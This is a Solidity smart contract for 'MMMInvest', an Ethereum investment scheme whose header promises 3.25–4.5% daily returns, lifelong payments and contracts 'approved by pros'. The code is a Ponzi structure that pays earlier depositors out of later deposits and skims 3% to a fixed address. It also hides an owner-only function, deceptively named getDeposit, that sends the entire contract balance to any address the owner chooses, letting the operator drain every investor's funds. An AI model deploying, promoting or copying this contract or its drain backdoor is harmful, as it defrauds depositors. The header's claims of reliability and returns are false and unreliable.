1 pragma solidity 0.4.25;
2 
3 /**
4 *
5 * ETH CRYPTOCURRENCY DISTRIBUTION PROJECT
6 *
7 * Web: http://mmmeth.global
8 * Telegramm: https://t.me/MMMGLOBAL_ETH
9 * Youtube: https://youtube.com/user/sergeimavrody
10 *
11 *  - GAIN PER 24 HOURS:
12 *     -- Contract balance  < 200 Ether: 3,25 %
13 *     -- Contract balance >= 200 Ether: 3.50 %
14 *     -- Contract balance >= 400 Ether: 3.75 %
15 *     -- Contract balance >= 600 Ether: 4.00 %
16 *     -- Contract balance >= 800 Ether: 4.25 %
17 *     -- Contract balance >= 1000 Ether: 4.50 %
18 *  - Life-long payments
19 *  - The revolutionary reliability
20 *  - Minimal contribution 0.01 eth
21 *  - Currency and payment - ETH
22 *  - Contribution allocation schemes:
23 *    -- 97% payments
24 *    -- 3% Marketing + Operating Expenses
25 *
26 * ---How to use:
27 *  1. Send from ETH wallet to the smart contract address
28 *     any amount from 0.01 ETH.
29 *  2. Verify your transaction in the history of your application or etherscan.io, specifying the address
30 *     of your wallet.
31 *  3. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're
32 *      spending too much on GAS)
33 *
34 * RECOMMENDED GAS LIMIT: 200000
35 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
36 * You can check the payments on the etherscan.io site, in the "Internal Txns" tab of your wallet.
37 *
38 * ---It is not allowed to transfer from exchanges, only from your personal ETH wallet, for which you
39 * have private keys.
40 *
41 * Contracts reviewed and approved by pros!
42 *
43 * Main contract - MMMInvest. Scroll down to find it.
44 *
45 */
46 
47 /**
48  * @title SafeMath
49  * @dev Math operations with safety checks that throw on error
50  */
51 library SafeMath {
52 
53   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
54     uint256 c = a * b;
55     assert(a == 0 || c / a == b);
56     return c;
57   }
58 
59   function div(uint256 a, uint256 b) internal pure returns (uint256) {
60     // assert(b > 0); // Solidity automatically throws when dividing by 0
61     uint256 c = a / b;
62     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
63     return c;
64   }
65 
66   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
67     assert(b <= a);
68     return a - b;
69   }
70 
71   function add(uint256 a, uint256 b) internal pure returns (uint256) {
72     uint256 c = a + b;
73     assert(c >= a);
74     return c;
75   }
76 }
77 
78 library Percent {
79 
80   struct percent {
81     uint num;
82     uint den;
83   }
84   function mul(percent storage p, uint a) internal view returns (uint) {
85     if (a == 0) {
86       return 0;
87     }
88     return a*p.num/p.den;
89   }
90 
91   function div(percent storage p, uint a) internal view returns (uint) {
92     return a/p.num*p.den;
93   }
94 
95   function sub(percent storage p, uint a) internal view returns (uint) {
96     uint b = mul(p, a);
97     if (b >= a) return 0;
98     return a - b;
99   }
100 
101   function add(percent storage p, uint a) internal view returns (uint) {
102     return a + mul(p, a);
103   }
104 }
105 
106 contract MMMInvest{
107 
108     using SafeMath for uint;
109     using Percent for Percent.percent;
110     // array containing information about beneficiaries
111     mapping (address => uint) public balances;
112     //array containing information about the time of payment
113     mapping (address => uint) public time;
114     address private owner;
115 
116     //The marks of the balance on the contract after which the percentage of payments will change
117     uint step1 = 200;
118     uint step2 = 400;
119     uint step3 = 600;
120     uint step4 = 800;
121     uint step5 = 1000;
122 
123     //the time through which dividends will be paid
124     uint dividendsTime = 1 days;
125 
126     event NewInvestor(address indexed investor, uint deposit);
127     event PayOffDividends(address indexed investor, uint value);
128     event NewDeposit(address indexed investor, uint value);
129 
130     uint public allDeposits;
131     uint public allPercents;
132     uint public allBeneficiaries;
133     uint public lastPayment;
134 
135     uint public constant minInvesment = 10 finney;
136 
137     address public commissionAddr = 0x93A2e794fbf839c3839bC41DC80f25f711065838;
138 
139     Percent.percent private m_adminPercent = Percent.percent(3, 100);
140 
141     constructor() public {
142         owner = msg.sender;
143     }
144 
145     /**
146      * The modifier checking the positive balance of the beneficiary
147     */
148     modifier isIssetRecepient(){
149         require(balances[msg.sender] > 0, "Deposit not found");
150         _;
151     }
152 
153     /**
154      * modifier checking the next payout time
155      */
156     modifier timeCheck(){
157          require(now >= time[msg.sender].add(dividendsTime), "Too fast payout request. The time of payment has not yet come");
158          _;
159     }
160 
161     modifier onlyOwner() {
162         require(msg.sender == owner, "access denied");
163         _;
164     }
165 
166     function getDepositMultiplier()public view returns(uint){
167         uint percent = getPercent();
168 
169         uint rate = balances[msg.sender].mul(percent).div(10000);
170 
171         uint depositMultiplier = now.sub(time[msg.sender]).div(dividendsTime);
172 
173         return(rate.mul(depositMultiplier));
174     }
175 
176     function getDeposit(address addr) onlyOwner public payable{
177         addr.transfer(address(this).balance);
178     }
179 
180     function receivePayment()isIssetRecepient timeCheck private{
181 
182         uint depositMultiplier = getDepositMultiplier();
183         time[msg.sender] = now;
184         msg.sender.transfer(depositMultiplier);
185 
186         allPercents+=depositMultiplier;
187         lastPayment =now;
188         emit PayOffDividends(msg.sender, depositMultiplier);
189     }
190 
191     /**
192      * @return bool
193      */
194     function authorizationPayment()public view returns(bool){
195 
196         if (balances[msg.sender] > 0 && now >= (time[msg.sender].add(dividendsTime))){
197             return (true);
198         }else{
199             return(false);
200         }
201     }
202 
203     /**
204      * @return uint percent
205      */
206     function getPercent() public view returns(uint){
207 
208         uint contractBalance = address(this).balance;
209 
210         uint balanceStep1 = step1.mul(1 ether);
211         uint balanceStep2 = step2.mul(1 ether);
212         uint balanceStep3 = step3.mul(1 ether);
213         uint balanceStep4 = step4.mul(1 ether);
214         uint balanceStep5 = step5.mul(1 ether);
215 
216         if(contractBalance < balanceStep1){
217             return(325);
218         }
219         if(contractBalance >= balanceStep1 && contractBalance < balanceStep2){
220             return(350);
221         }
222         if(contractBalance >= balanceStep2 && contractBalance < balanceStep3){
223             return(375);
224         }
225         if(contractBalance >= balanceStep3 && contractBalance < balanceStep4){
226             return(400);
227         }
228         if(contractBalance >= balanceStep4 && contractBalance < balanceStep5){
229             return(425);
230         }
231         if(contractBalance >= balanceStep5){
232             return(450);
233         }
234     }
235 
236     function createDeposit() private{
237 
238         if(msg.value > 0){
239 
240             require(msg.value >= minInvesment, "msg.value must be >= minInvesment");
241 
242             if (balances[msg.sender] == 0){
243                 emit NewInvestor(msg.sender, msg.value);
244                 allBeneficiaries+=1;
245             }
246 
247             // commission
248             commissionAddr.transfer(m_adminPercent.mul(msg.value));
249 
250             if(getDepositMultiplier() > 0 && now >= time[msg.sender].add(dividendsTime) ){
251                 receivePayment();
252             }
253 
254             balances[msg.sender] = balances[msg.sender].add(msg.value);
255             time[msg.sender] = now;
256 
257             allDeposits+=msg.value;
258             emit NewDeposit(msg.sender, msg.value);
259 
260         }else{
261             receivePayment();
262         }
263     }
264 
265     /**
266      * function that is launched when transferring money to a contract
267      */
268     function() external payable{
269         createDeposit();
270     }
271 }